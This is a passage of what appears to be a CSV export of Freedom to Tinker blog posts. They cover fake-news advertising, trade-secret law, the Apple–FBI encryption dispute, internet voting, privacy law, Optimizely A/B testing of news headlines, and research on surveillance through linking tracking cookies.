of Philosophy at Rochester Institute of Technology are co-authors of Re-Engineering Humanity, Cambridge University Press: forthcoming in April 2018."
"189","2016-12-14","2023-03-24","https://freedom-to-tinker.com/2016/12/14/disrupting-the-business-model-of-the-fake-news-industry/","By Katherine Haenschen & Paul Ellenbogen In the aftermath of the 2016 election, researchers and media professionals alike seized on the vast proliferation of so-called “Fake News” on Facebook as a cause for concern. An informed citizenry is a necessary condition for democracy, so it is far from ideal to have millions of people consuming intentionally misleading information masquerading as hard news. Now that Facebook has admitted that it has a problem with Fake News, Mark Zuckerberg and Co. need to do even more to prevent its spread on the platform. We propose one solution: Facebook should block advertising links to Fake News websites and Fake News pages on the Facebook platform itself. When we talk about Fake News, we’re referring to websites that intentionally and knowingly publish factually untrue content intended to masquerade as traditional “hard news.” Individuals may choose to publish Fake News for political reasons, such as seeking to impact voting decisions. However, there is also a profit motive behind Fake News: publishers can make big money from advertising revenue that results from traffic to their sites. The Fake News business model utilizes Facebook’s paid features to gain readers and build audiences. Facebook offers a variety of advertising options for individuals looking to reach its 156 million users in the United States, including newsfeed and sidebar ads and promoted posts from pages. It is Facebook’s advertising features that should be rendered unavailable for the paid promotion of Fake News to users. There is precedent for calling on Facebook to block Fake News from being advertised directly to its users: Facebook already bans certain kinds of ads on the platform such as those promoting dietary supplements and “controversial content.” Additionally, Facebook announced that it will stop placing ads on third-party Fake News websites. Now, we are calling on Facebook to ban Fake News from being advertised and promoted on the Facebook platform itself. Facebook should apply this type of ban even if it hurts Facebook’s own revenue. There’s Big Money In Fake News Media stories about Fake News producers emphasize the tremendous profits to be made in publishing knowingly false information and helping it to “go viral” on Facebook. Display ad revenue generated by Fake News sites can reach $10,000 to $30,000 per month. One Macedonian teen who publishes Fake News sites told Buzzfeed that advertising revenue could reach thousands of dollars per day or week. And though Google and Facebook have blocked the sites from their third-party advertising platforms, the Fake News publishers also note that there is no shortage of advertising networks willing to display ads on their websites. The reach of these articles amounts to millions of Facebook shares and clicks to the website, in turn generating millions of ad impressions, according to Buzzfeed. The same articles about Fake News sites indicate that publishers are not bothered by the potential impact of sharing incorrect information. A Macedonian teen who operated multiple sites admitted that his content was “bad, false, and misleading,” and that he was motivated by the advertising revenue generated by his Fake News site. Therefore, if Facebook wants to curtail the proliferation of Fake News on its website, it should disrupt its business model using tools that are already at the platform’s disposal. The Fake News Business Model Multiple news articles have referenced Fake News producers’ use of Facebook advertising features to promulgate their posts. Here’s how the business model for Fake News works, with each step in the process illustrated by the diagram below: An individual publishes false information on a Fake News website, then pays to advertise a link to the post in Facebook users’ newsfeeds. Facebook profits from advertising on its platform, earning money for every person who clicks the link or every 1,000 users who see the ads. Facebook users click on the advertised links and go to the Fake News website, generating an impression for each display ad on the website. The Fake News site earns revenue from the resulting advertising impressions, which amount to millions of page views and tens of thousands of dollars per month. Publishers must have a Facebook page to run newsfeed ads. As such, an ancillary cycle exists in which Fake News Publishers can promote this page to gain fans and organic traffic. Fake News producers advertise their Page to fans, growing an organic Facebook audience to whom they can share links at no cost. Fans can share these links to their own Facebook networks, furthering the organic reach of Fake News. This is how something “goes viral.” As long as the cost of the Facebook ads that promote the posts is lower than the display ad revenue from the resulting clicks, the business model above will generate net income for the Fake News producer. Cut Off Paid Features for Fake News Our solution is simple: Facebook needs to deny the use of paid features by pages that promote Fake News. This means Fake News pages should not be able to run newsfeed and sidebar ads, promote page posts, or market their Facebook page to gain fans. Furthermore, Facebook should block any third-party attempts to advertise links to Fake News sites. Currently, any individual with a Facebook account can create a public page and use it to run ads for Fake News stories in Facebook users’ newsfeeds. Banning all advertising links to Fake News sites would prevent publishers from setting up new and deceptive Facebook pages for the purpose of advertising. Facebook has already taken action to limit its role in directly funding Fake News. The platform cut off advertising on — but not leading to — Fake News websites, as has Google’s AdSense network. However, the Facebook advertising platform can still be used to drive traffic to these sites and fuel the cycle detailed above. Even if it does ban the use of advertising outbound links to Fake News sites, Facebook will still need to grapple with the size of Fake News pages, some of which surpass 700,000 fans and have a tremendous potential for organic reach. Our purpose is not to weigh in on that argument, but simply to point out a simple step Facebook can take that is consistent with its external ad placement on third-party sites. Facebook Already Bans Certain Advertisers Furthermore, a ban on the use of Facebook’s advertising features by Fake News sites would be in keeping with existing rules pertaining to the kinds of advertisers that can use the platform to reach users. For example, Facebook restricts the advertising of unsafe supplements at its “sole discretion,” such as various diet aids and performance-enhancing substances. Other prohibited content includes “controversial content,” which is defined as “…content that exploits controversial political or social issues for commercial purposes.” Given that Fake News producers are open about their profit motivations, their use of Facebook advertisements to drive traffic should be considered a commercial purpose rather than a political purpose. As such, Facebook should use its existing rules to draw a line between political content and commercial content. If it fails to do so, unscrupulous individuals could start dressing up their questionable advertisements as political speech — Donald Trump Diet Pills, anyone? They’ll make your waistline great again! Distinguishing between Fake News and news from reputable outlets is something that Facebook is already committed to doing now that it has pledged to pull advertisements from Fake News sites in the Facebook Audience Network program. Facebook could use the same criteria that it uses in the Audience Network on its advertising platform. While we are not proposing a heuristic to determine what is Fake News and what is merely an opinion piece devoid of factual content, we suggest that Facebook apply the same rules for banned third-party sites to advertisements on the platform for those very same sites. Fight Fake News, Or Else Everyone Gets Played It isn’t clear how Facebook’s long-term interests are served by enabling Fake News to market to its users, essentially creating a back door around its own advertising policies. Facebook makes money from advertisements for Fake News, but in the long term it may come to hurt Facebook, with suspicion and lost goodwill outweighing earnings from this category of advertisements. If Facebook chooses to regulate Fake News as political speech, Zuckerberg et al. are setting themselves up to be useful idiots for websites trying to make a quick buck off sensationalist and false stories. As for the users, they are being intentionally misled with incorrect articles about political actors, which have the potential to impact issue awareness and candidate choice. At worst, people are basing their vote on misinformation-for-profit. At best, users may be getting quick entertainment out of these links (if they recognize them as false), but for the most part it seems like the Fake News operators are getting the benefit of the arrangement. Removing paid advertisements for these sites from users’ Facebook newsfeeds is not going to negatively impact their lives. Furthermore, these individuals remain free to like the Facebook pages for Fake News sites and share their posts organically with friends. We are merely proposing that Facebook cut off the use of its paid features to promote links to Fake News to wider audiences, in accordance with its existing advertising policies. Advertisements for Fake News should be regulated like ads for “controversial content” and dietary supplements. This would cut off one stream of revenue for these Fake News websites, forcing them to gain traffic from Facebook entirely through organic reach. Failure to ban this type of advertising would suggest that Facebook values its own revenue over the need to curtail bad actors who are using its platform to intentionally spread misinformation harmful to our democratic society."
"190","2016-01-23","2023-03-24","https://freedom-to-tinker.com/2016/01/23/updating-the-defend-trade-secrets-act/","Despite statements to the contrary by sponsors and supporters in April 2014, August 2015, and October 2015, backers of the Defend Trade Secrets Act (DTSA) now aver that “cyber espionage is not the primary focus” of the legislation. At last month’s Senate Judiciary Committee hearing, the DTSA was instead supported by two different primary reasons: the rise of trade secret theft by rogue employees and the need for uniformity in trade secret law. While a change in a policy argument is not inherently bad, the alteration of the core justification for a bill should be considered when assessing it. Perhaps the new position of DTSA proponents acknowledges the arguments by over 40 academics, including me, that the DTSA will not reduce cyberespionage. However, we also disputed these new rationales in that letter: the rogue employee is more than adequately addressed by existing trade secret law, and there will be less uniformity in trade secrecy under the DTSA because of the lack of federal jurisprudence. The downsides — including weakened industry cybersecurity, abusive litigation against small entities, and resurrection of the anti-employee inevitable disclosure doctrine — remain. As such, I continue to oppose the DTSA as a giant trade secrecy policy experiment with little data to back up its benefits and much evidence of its costs."
"191","2016-04-20","2023-03-24","https://freedom-to-tinker.com/2016/04/20/the-defend-trade-secrets-act-and-whistleblowers/","As Freedom to Tinker readers know, I’ve been an active opponent of the federal Defend Trade Secrets Act (DTSA). Though my position on the DTSA remains unchanged, I was both surprised and pleased to see that the revised Defend Trade Secrets Act now includes a narrow, but potentially useful, provision intended to protect whistleblowers from trade secret misappropriation actions. As attendees at yesterday’s wonderful CITP talk by Bart Gellman were fortunate to hear, whistleblowing remains a critical but imperfect tool of public access to the internal operations of our institutions, from corporations to government. Trade secrecy operates in the opposite direction, and has the robust ability to thwart regulation, limit public accountability, and criminalize whistleblowing. I’ve regularly called trade secrecy the most powerful intellectual property law (IP) tool of information control, as it prevents not just use of, but access to and even knowledge about the very existence of information. Indeed, it surpasses other IP law in that power by a wide margin. Thus, if the DTSA is moving forward, the inclusion of even a limited whistleblower exception in the DTSA is a good thing. Nonetheless, it is very important to recognize what this provision won’t achieve. As written, the provision prevents liability under federal and state trade secret law for “the disclosure of a trade secret that … is made … in confidence to a Federal, State, or local government official, either directly or indirectly, or to an attorney; and … solely for the purpose of reporting or investigating a suspected violation of law; or … is made in a complaint or other document filed in a lawsuit or other proceeding, if such filing is made under seal.” Thus, as written, the provision does not appear to immunize sharing trade secret information with the press or the public at large. As Gellman’s work has shown, the press is often the first and only avenue for access to critical information about our public and private black boxes. In fact, for the provision to have any power, one has to believe that administrative entities both want access to, and will act upon, trade secret information that reveals problematic behaviors by regulated industries. That assumption is not always clear. [Disclosure: I was a member of the North Carolina Mining and Energy Commission’s Trade Secret Study Group that advised on the linked North Carolina hydraulic fracturing regulations. Needless to say, I was not pleased that the revelation of hydraulic fracturing trade secrets was criminalized, and advocated against such a result]. Thus, public (or at least greater) access to trade secret information is often needed, if public accountability and policy course-correction are the goals. This provision does not do much to achieve that end. Additionally, the provision does not apparently immunize sharing information for purposes of pointing out where the law might be wrong, misguided or unjust. If the importance of that issue is not readily apparent, please see the Panama Papers leak — which includes many trade secrets — and the fact that, as The Atlantic pointed out, “the real scandal is what’s legal.” I’ll have more to say about these broad issues in upcoming scholarship, but for now, the critical point is to recognize that the DTSA’s whistleblower provision is quite narrow. While there are other issues with the provision that will likely lead to litigation, two other big points are worth making. First, the provision only focuses on trade secrets, and not the broader categories of “confidential information,” “proprietary information,” and “business information.” I’ve written (with a longer exploration to follow in the fall) that this “confidentiality creep” is increasingly moving much public and private activity out of the ambit of public and regulatory oversight and input. I do not expect the DTSA to address these issues, but I also fear that the DTSA will be used to amplify the dubious claims to broad secrecy that often prevent public access in the first place. Put simply, many trade secrets should not be treated as such, especially when they’re neither “trade” related nor “secret.” Finally, there’s a potentially troublesome “rule of construction” that states that “nothing in this subsection shall be construed to authorize, or limit liability for, an act that is otherwise prohibited by law, such as the unlawful access of material by unauthorized means.” This looks like a carve-out that could swallow the entire rule. Could an employer require an employee to sign an agreement that restricts access to employer information, thereby invoking the rule so as to take action against the putative whistleblower? Would a subsequent or concurrent violation of the federal Computer Fraud and Abuse Act, which is notoriously vague and overbroad, negate the provision? These are open questions. In sum, the whistleblower provision is a welcome but limited addition to the flawed DTSA. Ideally, Congress would scrap the DTSA and spend more time gathering evidence and data about how trade secrecy is used and can be abused by putative trade secret holders. But as that seems increasingly unlikely, understanding what the DTSA’s whistleblower provision is and isn’t will be important — especially for the would-be whistleblower."
"192","2016-02-22","2023-03-24","https://freedom-to-tinker.com/2016/02/22/an-analogy-to-understand-the-fbis-request-of-apple/","After my previous blog post about the FBI, Apple, and the San Bernadino iPhone, I’ve been reading many other bloggers and news articles on the topic. What seems to be missing is a decent analogy to explain the unusual nature of the FBI’s demand and the importance of Apple’s stance in opposition to it. Before I dive in, it’s worth understanding what the FBI’s larger goals are. Cyrus Vance Jr., the Manhattan DA, states it clearly: “no smartphone lies beyond the reach of a judicial search warrant.” That’s the FBI’s real goal. The San Bernadino case is just a vehicle toward achieving that goal. With this in mind, it’s less important to focus on the specific details of the San Bernadino case, the subtle improvements Apple has made to the iPhone since the 5c, or the apparent mishandling of the iCloud account behind the San Bernadino iPhone. Our Analogy: TSA Luggage Locks When you check your bags in the airport, you may well want to lock them, to keep baggage handlers and other interlopers from stealing your stuff. But, of course, baggage inspectors have a legitimate need to look through bags. Your bags don’t have any right of privacy in an airport. To satisfy these needs, we now have “TSA locks”. You get a combination you can enter, and the TSA gets their own secret key that allows airport staff to open any TSA lock. That’s a “backdoor”, engineered into the lock’s design. What’s the alternative? If you want the TSA to have the technical capacity to search a large percentage of bags, then there really isn’t an alternative. After all, if we used “real” locks, then the TSA would be “forced” to cut them open. But consider the hypothetical case where these sorts of searches were exceptionally rare. At that point, the local TSA could keep hundreds of spare locks, of all makes and models. They could cut off your super-duper strong lock, inspect your bag, and then replace the cut lock with a brand new one of the same variety. They could extract the PIN or key cylinder from the broken lock and install it in the new one. They could even rough up the new one so it looks just like the original. Needless to say, this would be a specialized skill and it would be expensive to use. That’s pretty much where we are in terms of hacking the newest smartphones. Another area where this analogy holds up is all the people who will “need” access to the backdoor keys. Who gets the backdoor keys? Sure, it might begin with the TSA, but every baggage inspector in every airport, worldwide, will demand access to those keys. And they’ll even justify it, because their inspectors work together with ours to defeat smuggling and other crimes. We’re all in this together! Next thing you know, the backdoor keys are everywhere. Is that a bad thing? Well, the TSA backdoor lock scheme is only as secure as their ability to keep the keys a secret. And what happened? The TSA mistakenly allowed the Washington Post to publish a photo of all the keys, which makes it trivial for anyone to fabricate those keys. (CAD files for them are now online!) Consequently, anybody can take advantage of the TSA locks’ designed-in backdoor, not just all the world’s baggage inspectors. For San Bernadino, the FBI wants Apple to retrofit a backdoor mechanism where there wasn’t one previously. The legal precedent that the FBI wants creates a capability to convert any luggage lock into a TSA backdoor lock. This would only be necessary if they wanted access to lots of phones, at a scale where their specialized phone-cracking team becomes too expensive to operate. This no doubt becomes all the more pressing for the FBI as modern smartphones get better and better at resisting physical attacks. Where the analogy breaks down: If you travel with expensive stuff in your luggage, you know well that those locks have very limited resistance to an attacker with bolt cutters. If somebody steals your luggage, they’ll get your stuff, whereas that’s not necessarily the case with a modern iPhone. These phones are akin to luggage having some kind of self-destruct charge inside. You force the luggage open and the contents will be destroyed. Another important difference is that much of the data that the FBI presumably wants from the San Bernadino phone can be gotten elsewhere, e.g., phone call metadata and cellular tower usage metadata. We have very little reason to believe that the FBI needs anything on that phone whatsoever, relative to the mountain of evidence that it already has. Why this analogy is important: The capability to access the San Bernadino iPhone, as the court order describes it, is a one-off thing—a magic wand that converts precisely one traditional luggage lock into a TSA backdoor lock, having no effect on any other lock in the world. But as Vance makes clear in his New York Times opinion, the stakes are much higher than that. The FBI wants this magic wand, in the form of judicial orders and a bespoke Apple engineering process, to gain backdoor access to any phone in their possession. If the FBI can go to Apple to demand this, then so can any other government. Apple will quickly want to get itself out of the business of adjudicating these demands, so it will engineer in the backdoor feature once and for good, albeit under duress, and will share the necessary secrets with the FBI and with every other nation-state’s police and intelligence agencies. In other words, Apple will be forced to install a TSA backdoor key in every phone they make, and so will everybody else. While this would be lovely for helping the FBI gather the evidence it wants, it would be especially lovely for foreign intelligence officers, operating on our shores, or going after our citizens when they travel abroad. If they pickpocket a phone from a high-value target, our FBI’s policies will enable any intel or police organization, anywhere, to trivially exercise any phone’s TSA backdoor lock and access all the intel within. Needless to say, we already have a hard time defending ourselves from nation-state adversaries’ cyber-exfiltration attacks. Hopefully, sanity will prevail, because it would be a monumental error for the government to require that all our phones be engineered with backdoors."
"193","2016-03-22","2023-03-24","https://freedom-to-tinker.com/2016/03/22/internet-voting-utah-gop-primary-election/","Utah’s Republican presidential primary was conducted today by Internet. If you have your voter-registration PIN, or even if you don’t, visit https://ivotingcenter.gop and you will learn something about Internet voting!"
"194","2016-04-21","2023-03-24","https://freedom-to-tinker.com/2016/04/21/apple-encryption-saga-and-beyond-what-u-s-courts-can-learn-from-canadian-caselaw/","It has been said that privacy is “at risk of becoming a real human right.” The exponential increase of personal information in the hands of organizations, particularly sensitive data, creates a significant rise in the perils accompanying formerly negligible privacy incidents. At one time considered too intangible to merit even token compensation, risks of harm to privacy interests have become so ubiquitous in the past three years that they require special attention. Legal and social changes have for their part also increased potential privacy liability for private and public entities when they promise – and fail – to guard our personal data (think Ashley Madison…). First among those changes has been the emergence of a “privacy culture” — a process bolstered by the trickle-down effect of the Julia Angwin’s investigative series titled “What They Know,” and the heightened attention that the mainstream media now attaches to privacy incidents. Second, courts in various common law jurisdictions are beginning to recognize intangible privacy harms and have been increasingly willing to certify class action lawsuits for privacy infringements that previously would have been summarily dismissed without hesitation. Prior to 2012, it was difficult to find examples of judicially recognized losses arising from privacy breaches. Since then however, the legal environment in common law jurisdictions and in Canada in particular has changed dramatically. Claims related to privacy mishaps are now commonplace, and there has been an exponential multiplication in the number of matters involving inadvertent communication or improper disposal of personal data, portable devices, and cloud computing. The obvious overlap between personal and professional e-mail accounts, Internet use, and quasi-ubiquitous surveillance renders the classic “reasonable expectation” standard quasi-obsolete, or at least unhelpful in articulating and enforcing privacy rights and duties. Assessing an individual’s right to privacy by reference to society’s conception of the measure of privacy that one is entitled to reasonably expect is particularly awkward when such expectations are rapidly eroding, precisely by reason of eventual social habituation to recurring intrusions. Plainly put and paradoxically: the more we are watched, the more we expect to be watched. Cognizant of the nuance that the digital age brings to privacy harm, in A.B. v. Bragg Communications Inc. (2012), the Supreme Court of Canada allowed an adolescent to proceed anonymously with a request that an ISP release the identity of the creator of a fake Facebook account, which included various explicit and disturbing sexual references. Importantly, and with broad ramifications, the Supreme Court presumed harm based on the circumstances, recognizing intangible privacy harms and using these as a basis for allowing A.B. to proceed anonymously in her legal action. As previously noted, a significant obstacle to recovery for privacy-related infringements more generally has been the requirement to show harm, as traditionally defined. But on the heels of A.B. v. Bragg, this is arguably no longer the case, or at least not to the same extent as the Supreme Court of Canada signaled willingness to recognize assertions of intangible damages arising from privacy violations. Despite the apparent distinctiveness of these cases (and many others), revisited in unison they herald the emergence of a far more robust and nuanced conception of privacy. It is a conception predicated on proportionality and purposive, contextual analysis, rather than the essentially circular reasonable expectations standard. This approach significantly recognizes and then balances organizations’ (such as Apple or providers’ such as Rogers’) affirmative duty to protect clients’ delicate data with security considerations—as the Ontario Court of Justice wisely opined only last month in R. v. Rogers Communications (2016 ONSC). This very principle of proportionality, it is posited, should in turn be harnessed with an eye towards developing a coherent normative framework for resolving future impasses the likes of the Apple/FBI privacy dispute, and others like it that are sure to follow. Accordingly, US Courts might wish to consider this “Canadian” perspective anchored in proportionality as governments worldwide struggle to fulfill their duty to protect against increasingly borderless threats, at times seeking to recruit private parties such as Apple in the thorny process. Moving beyond an ad hoc approach and towards a sound, consistent and articulate normative framework is key—even if a courtroom battle was averted this time around."
"195","2016-11-07","2023-03-24","https://freedom-to-tinker.com/2016/11/07/privacy-a-personality-not-property-right/","The European Court of Justice’s decision in Google v. Costeja González appears to compel search engines to remove links to certain impugned search results at the request of individual Europeans (and potentially others beyond Europe’s borders). What is more, Costeja may inadvertently and ironically have the effect of appointing American companies as private censors and arbiters of the European public interest. Google and other private entities are therefore saddled incomprehensibly with the gargantuan task of determining how to “balance the need for transparency with the need to protect people’s identities,” and Costeja’s failure to provide adequate interpretive guidelines further leads to ad hoc approaches by these companies. In addition, transparency and accountability are notoriously difficult to cultivate when balancing delicate constitutional values, such as freedom of expression and privacy. Indeed, even the constitutional courts and policy makers who typically perform this balancing struggle with it—think of the controversy associated with so-called “judicial activism.” The difficulty skyrockets when the balancers are instead inexperienced and reticent corporate actors, who presumably lack the requisite public legitimacy for such matters, especially when dealing with foreign (non-U.S.) nationals. The Costeja decision attempts to paper over the growing divergence between Anglo-American and continental approaches to privacy. Its poor results highlight internal normative contradictions within the continental tradition and illustrate the urgency of re-conceptualizing digital privacy in a more transystemically viable fashion. Informational privacy must ultimately be re-theorized in a manner that would obviate—or at the very least palliate—the need for a stand-alone, ill-defined, and under-theorized “right to be forgotten.” That right is in essence a procedural one predicated on the impracticable idea that individuals “own” data, rather than a right to their identities themselves. It therefore fails to accord with the long-established (continental) tradition of personality rights, which, unlike its common law counterpart, emphasizes personhood not property. In the end, a more robust construction of privacy predicated on protecting identity would allow for a more nuanced balancing of privacy and freedom of expression. Consequently, rather than further expanding an already divisive, property-based procedural “right to be forgotten,” Europeans (and perhaps others as well) would do better to harness the ample protections found in traditional, substantive civil concepts pertaining to privacy—most notably personality rights—so as to develop a coherent set of principles that contextualize identity and the perception of personal (and/or corporate) identity in the digital realm. For unlike the poorly theorized “right to be forgotten,” which unceremoniously imports all the rights traditionally associated with property, the civil tradition offers time-tested, flexible principles for this purpose."
"196","2016-05-26","2023-03-24","https://freedom-to-tinker.com/2016/05/26/a-peek-at-ab-testing-in-the-wild/","[Dillon Reisman was previously an undergraduate at Princeton when he worked on a neat study of the surveillance implications of cookies. Now he’s working with the WebTAP project again in a research + engineering role. — Arvind Narayanan] In 2014, Facebook revealed that they had manipulated users’ news feeds for the sake of a psychology study looking at users’ emotions. We happen to know about this particular experiment because it was the subject of a publicly-released academic paper, but websites do “A/B testing” every day that is completely opaque to the end-user. Of course, A/B testing is often innocuous (say, to find a pleasing color scheme), but the point remains that the user rarely has any way of knowing in what ways their browsing experience is being modified, or why their experience is being changed in particular. By testing websites over time and in a variety of conditions we could hope to discover how users’ browsing experience is manipulated in not-so-obvious ways. But one third-party service actually makes A/B testing and user tracking human-readable — no reverse-engineering or experimentation necessary! This is the widely-used A/B testing provider Optimizely; Jonathan Mayer had told us it would be an interesting target of study.* Their service is designed to expose in easily-parsable form how its clients segment users and run experiments on them directly in the JavaScript they embed on websites. In other words, if example.com uses Optimizely, the entire logic used by example.com for A/B testing is revealed to every visitor of example.com. That means that the data collected by our large-scale web crawler OpenWPM contains the details of all the experiments that are being run across the web using Optimizely. In this post I’ll show you some interesting things we found by analyzing this data. We’ve also built a Chrome extension, Pessimizely, that you can download so you too can see a website’s Optimizely experiments. When a website uses Optimizely, the extension will alert you and attempt to highlight any elements on the page that may be subject to an experiment. If you visit nytimes.com, it will also show you alternative news headlines when you hover over a title. I suggest you give it a try! The New York Times website, with headlines that may be subject to an experiment highlighted by Pessimizely. The Optimizely Scripts Our OpenWPM web crawler collects and stores javascript embedded on every page it visits. This makes it straightforward to make a query for every page that uses Optimizely and grab and analyze the code they get from Optimizely. Once collected, we investigated the scripts through regular expression-matching and manual analysis.   ""4495903114"": {
      ""code"": …
      ""name"": ""100000004129417_1452199599
               [A.] New York to Appoint Civilian to Monitor Police Surveillance -- 
               [B.] Sued Over Spying on Muslims, New York Police Get Oversight"",
      ""variation_ids"": [""4479602534"",""4479602535""],
      ""urls"": [{
        ""match"": ""simple"",
        ""value"": ""http://www.nytimes.com""
      }],
      ""enabled_variation_ids"": [""4479602534"",""4479602535""]
    }, An example of an experiment from nytimes.com that is A/B testing two variations of a headline in a link to an article. From a crawl of the top 100k sites in January 2016, we found and studied 3,306 different websites that use Optimizely. The Optimizely script for each site contains a data object that defines: How the website owner wants to divide users into “audiences,” based on any number of parameters like location, cookies, or user-agent. Experiments that the users might experience, and what audiences should be targeted with what experiments. The Optimizely script reads from the data object and then executes a javascript payload and sets cookies depending on if the user is in an experimental condition. The site owner populates the data object through Optimizely’s web interface – who on a website’s development team can access that interface and what they can do is a question for the site owner. The developer also helpfully provides names for their user audiences and experiments. In total, we found around 51,471 experiments on the 3,306 websites in our dataset that use Optimizely. On average each website has approximately 15.2 experiments, and each experiment has about 2.4 possible variations. We have only scratched the surface of some of the interesting things sites use A/B testing for, and here I’ll share a couple of the more interesting examples: News publishers test the headlines users see, with differences that impact the tone of the article A widespread use of Optimizely among news publishers is “headline testing.” To use an actual recent example from the nytimes.com, a link to an article headlined: “Turkey’s Prime Minister Quits in Rift With President” …to a different user might appear as… “Premier to Quit Amid Turkey’s Authoritarian Turn.” The second headline suggests a much less neutral take on the news than the first. That sort of difference can paint a user’s perception of the article before they’ve read a single word. We found other examples of similarly politically-sensitive headlines changing, like the following from pjmedia.com: “Judge Rules Sandy Hook Families Can Proceed with Lawsuit Against Remington” …could appear to some users as… “Second Amendment Under Assault by Sandy Hook Judge.” While editorial concerns might inform how news publishers change headlines, it’s clear that a major motivation behind headline testing is the need to drive clicks. A third variation we found for the Sandy Hook headline above is the much vaguer sounding “Huge Development in Sandy Hook Gun Case.” The Wrap, an entertainment news outlet, experimented with replacing “Disney, Paramount Had Zero LGBT Characters in Movies Last Year” with the more obviously “click-baity” headline “See Which 2 Major Studios Had Zero LGBT Characters in 2015 Movies.” We were able to identify 17 different news websites in our crawl that in the past have done some form of headline testing. This is most likely an undercount in our crawl — most of these 17 websites use Optimizely’s integrations with other third-party platforms like Parse.ly and WordPress for their headline testing, making them more easily identified. The New York Times website, for instance, implements its own headline testing code. Another limitation of what we’ve found so far is that the crawls that we analyzed only visit the homepage of each site. The OpenWPM crawler could be configured, however, to browse links from within a site’s homepage and collect data from those pages. A broader study of the practices of news publishers could use the tool to drill down deeper into news sites and study their headlines over time. Websites identify and categorize users based on money and affluence Many websites target users based on IP and geolocation. But when IP/geolocation are combined with notions of money the result is surprising. The website of a popular fitness tracker targets users that originate from a list of six hard-coded IP addresses labelled “IP addresses Spending more than $1000.” Two of the IP addresses appear to be larger enterprise customers — a medical research institute a prominent news magazine. Three belong to unidentified Comcast customers. These big-spending IP addresses were targeted in the past with an experiment presented the user a button that either suggested the user “learn more” about a particular product or “buy now.” Connectify, a large vendor of networking software, uses geolocation on a coarser level — they label visitors from the US, Australia, UK, Canada, Netherlands, Switzerland, Denmark, and New Zealand as coming from “Countries that are Likely to Pay.” Non-profit websites also experiment with money. charity: water (charitywater.org) and the Human Rights Campaign (hrc.org) both have experiments defined to change the default donation amount a user might see in a pre-filled text box. Web developers use third-party tools for more than just their intended use A developer following the path of least resistance might use Optimizely to do other parts of their job simply because it is the easiest tool available. Some of the more exceptional “experiments” deployed by websites are simple bug-fixes, described with titles like, “[HOTFIX][Core Commerce] Fix broken sign in link on empty cart,” or “Fix- Footer links errors 404.” Other experiments betray the haphazard nature of web development, with titles like “delete me,” “Please Delete this Experiment too,” or “#Bugfix.” We might see these unusual uses because Optimizely allows developers to edit and rollout new code with little engineering overhead. With the inclusion of one third-party script, a developer can leverage the Optimizely web interface to do a task that might otherwise take more time or careful testing. This is one example of how third-parties have evolved to become integral to the entire functionality and development of the web, raising security and privacy concerns. The need for transparency Much of the web is curated by inscrutable algorithms running on servers, and a concerted research effort is needed to shed light on the less-visible practices of websites. Thanks to the Optimizely platform we can at least peek into that secret world. We believe, however, that transparency should be the default on the web — not the accidental product of one third-party’s engineering decisions. Privacy policies are a start, but they generally only cover a website’s data collection and third-party usage on a coarse level. The New York Times Privacy Policy, for instance, does not even suggest that headline testing is something they might do, despite how it could drastically alter your consumption of the news. If websites had to publish more information about what third-parties they use and how they use them, regulators could use that information to better protect consumers on the web. Considering the potentially harmful effects of how websites might use third-parties, more transparency and oversight is essential. –@dillonthehuman * This was a conversation a year ago, when Jonathan was a grad student at Stanford."
"197","2014-12-19","2023-03-24","https://freedom-to-tinker.com/2014/12/19/how-cookies-can-be-used-for-global-surveillance/","Today we present an updated version of our paper [0] examining how the ubiquitous use of online tracking cookies can allow an adversary conducting network surveillance to target a user or surveil users en masse. In the initial version of the study, summarized below, we examined the technical feasibility of the attack. Now we’ve made the attack model more complete and nuanced as well as analyzed the effectiveness of several browser privacy tools in preventing the attack. Finally, inspired by Jonathan Mayer and Ed Felten’s The Web is Flat study, we incorporate the geographic topology of the Internet into our measurements of simulated web traffic and our adversary model, providing a more realistic view of how effective this attack is in practice. A passive network adversary may want to surveil users en masse over a time period where identifying information on users may change (e.g IP address, user agent string). In our earlier post, we summarized how the adversary can still succeed: “The diagram illustrates how the eavesdropper can use multiple third-party cookies to link traffic. When a user visits ‘www.exampleA.com,’ the response contains the embedded tracker X, with an ID cookie ‘xxx’. The visits to exampleA and to X are tied together by IP address, which typically doesn’t change within a single page visit [1]. Another page visited by the same user might embed tracker Y bearing the pseudonymous cookie ‘yyy’. If the two page visits were made from different IP addresses, an eavesdropper seeing these cookies can’t tell that the same browser made both visits. But if a third page, however, embeds both trackers X and Y, then the eavesdropper will know that IDs ‘xxx’ and ‘yyy’ belong to the same user.” Additionally, an adversary may be restricted in the traffic they are able to observe due to their location on the network or due to legal restrictions. For example, a state adversary may only have access to packets which pass through routers in their country. We use a combination of traceroute data, IP geolocation, and round trip times as described in Section 4.4 of our paper to build the view of a geographically restricted adversary. Under the updated model, we find that the cookie linking attack is very effective against users in several different locations. Using OpenWPM, a web measurement framework, we simulate 25 users browsing from a US location over a three month timespan. We find that the adversary is able to link 62% of an average user’s page visits together using only HTTP header data. When we repeat the same measurements with a somewhat coarser, but localized browsing model for simulated users in Europe and Asia, the adversary is able to link slightly less of the overall traffic, but still a significant amount. Additionally, we show how the adversary can link these clusters of page visits to real-world identities since several sites leak the user’s identity in plaintext. Next, we look at the NSA specifically, given what we know about the agency’s legal restrictions on surveillance. [2] The choice to examine the NSA is motivated by recent reports on their use of third-party cookies for surveillance and targeting (1, 2). We consider both US users and users browsing in Europe and Asia. Based on the NSA’s “one-end foreign” rule and the conservative assumption that most wiretapping happens in US borders or undersea cables, we assume that foreign-bound traffic originating in the US or US-bound traffic from other countries can potentially be surveilled. See the paper for a more detailed explanation. Under this attack model, the adversary is able to link 13% of traffic from Europe and 20% of traffic from Asia, even when the simulated users browse the popular sites local to their region. This is due to the density of third-party services being located in the Unites States. On the other hand, we find that large clusters of traffic don’t emerge when the attack is carried out on a user browsing in the US. That said, nearly a quarter of page visits for the average simulated US user are visible outside the US through third-parties and referrers, which could enable surveillance through other means. Effectiveness of browser privacy tools (lower values are better). Base = baseline, no protection. DNT = Do Not Track. Some 3p = Safari-style third-party cookie blocking. All 3p = Blocking all third-party cookies. HTTPS-E = HTTPS Everywhere. How well can a user defend themselves against cookie linking? Since the identifying cookies that enable the attack are from embedded third-parties, we examine how effective the attack is when a user attempts to block third parties using browser privacy tools. As the chart shows, Ghostery is the most effective tool, but still allows a quarter of traffic to be surveilled. Our work underscores the importance of HTTPS deployment on the web. It may not be apparent why third-party embedded content requires a secure connection, but our attack shows how it can enable significant vulnerabilities. As we’ve shown, users have the ability to reduce, but not eliminate, their exposure to surveillance through cookies. Websites and browser vendors must therefore share responsibility in protecting users. We’re excited about the proposal to mark HTTP as non-secure and hope that initiatives like Let’s Encrypt will lower the burden of HTTPS deployment and help build a safer web. [0] 